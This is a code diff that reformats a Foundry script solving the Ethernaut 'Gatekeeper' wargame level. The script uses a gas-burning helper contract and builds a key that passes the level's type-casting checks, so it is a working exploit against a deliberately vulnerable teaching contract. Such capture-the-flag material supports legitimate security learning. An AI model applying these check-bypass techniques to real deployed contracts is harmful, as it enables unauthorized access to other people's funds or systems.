@@ -1,18 +1,22 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.6.0;
 
-import { Script } from "forge-std/Script.sol";
-import { EthernautScript } from "src/common/EthernautScript.sol";
-import { Gatekeeper } from "./Problem.sol";
+import {Script} from "forge-std/Script.sol";
+import {EthernautScript} from "src/common/EthernautScript.sol";
+import {Gatekeeper} from "./Problem.sol";
 
-import 'openzeppelin-contracts/math/SafeMath.sol';
+import "openzeppelin-contracts/math/SafeMath.sol";
 
 contract Solution {
     using SafeMath for uint256;
-    uint256 randomValue;
-    event GasBurned(uint indexed iteration);
 
-    function breakIn(uint256 gasLimit, bytes8 key, Gatekeeper gatekeeper) external {
+    uint256 randomValue;
+
+    event GasBurned(uint256 indexed iteration);
+
+    function breakIn(uint256 gasLimit, bytes8 key, Gatekeeper gatekeeper)
+        external
+    {
         // I had to add this gas burning since otherwise forge script would run this transaction with gas limit set lower than the one specified in the function argument
         // TODO: Once forge supports specifying gas per tx, remove this (as well as the rest of the contract)
         burnGas(gasLimit);
@@ -20,11 +24,11 @@ contract Solution {
     }
 
     function burnGas(uint256 gasLimit) private {
-        uint iterations = 30;
-        for(uint i = 0; i < iterations; i++) {
-            randomValue = randomValue+ 1;
+        uint256 iterations = 30;
+        for (uint256 i = 0; i < iterations; i++) {
+            randomValue = randomValue + 1;
             emit GasBurned(i);
-            if(gasleft().sub(gasLimit) < 50000) {
+            if (gasleft().sub(gasLimit) < 50000) {
                 return;
             }
         }
@@ -32,7 +36,6 @@ contract Solution {
 }
 
 contract SolutionScript is EthernautScript {
-
     function solve(address payable _instanceAddress) internal override {
         Gatekeeper gatekeeper = Gatekeeper(_instanceAddress);
 
@@ -44,7 +47,7 @@ contract SolutionScript is EthernautScript {
         bytes8 key = bytes8(gateKeyUint);
         assert(uint32(uint64(key)) == uint16(uint64(key)));
         // Add a 1 bit in between bit 32 and 64
-        gateKeyUint = gateKeyUint + 2**33;
+        gateKeyUint = gateKeyUint + 2 ** 33;
         key = bytes8(gateKeyUint);
         assert(uint32(uint64(key)) != uint64(key));
         assert(uint32(uint64(key)) == uint16(tx.origin));
@@ -57,15 +60,13 @@ contract SolutionScript is EthernautScript {
         vm.stopBroadcast();
 
         assert(gatekeeper.entrant() == tx.origin);
-
     }
 
-    function getLevelAddress() internal view override returns(address) {
+    function getLevelAddress() internal view override returns (address) {
         return 0x9b261b23cE149422DE75907C6ac0C30cEc4e652A;
     }
 
-    function getCreationValue() internal view override returns(uint256) {
+    function getCreationValue() internal view override returns (uint256) {
         return 0.001 ether;
     }
 }
-
